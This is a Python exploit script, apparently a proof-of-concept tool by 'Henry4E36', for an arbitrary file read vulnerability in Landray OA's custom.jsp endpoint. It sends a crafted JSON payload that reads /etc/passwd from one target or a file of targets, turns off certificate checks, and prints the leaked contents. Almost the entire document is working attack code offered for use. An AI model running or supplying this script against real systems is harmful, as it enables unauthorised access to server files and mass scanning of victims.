#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
urllib3.disable_warnings()


def title():
    print("""
                           蓝凌OA custom.jsp 任意文件读取漏洞
                        use: python3  Landray-read.py
                             Author: Henry4E36
    """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        target_url = self.url + "/sys/ui/extend/varkind/custom.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = '''var={"body":{"file":"file:///etc/passwd"}}'''
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",

        }
        try:
            res = requests.post(url=target_url, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
            if "root" in res.text and res.status_code == 200:
                print("[-----------------------------------------]")
                print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 任意文件读取！\033[0m")
                print(f"[-] 读取/etc/passwd 中: ")
                print(f"[{chr(8730)}]  内容为:\n{res.text.strip()}")
                print("\n")
            else:
                print("[-----------------------------------------]")
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在任意文件读取！")
                print("\n")
        except Exception as e:
            print("[-----------------------------------------]")
            print("[\033[31mx\033[0m]  站点连接错误！")
            print("\n")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="蓝凌OA custom.jsp 任意文件读取漏洞 Options")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 Landray-read.py -u http://127.0.0.1\neg2:>>>python3 Landray-read.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
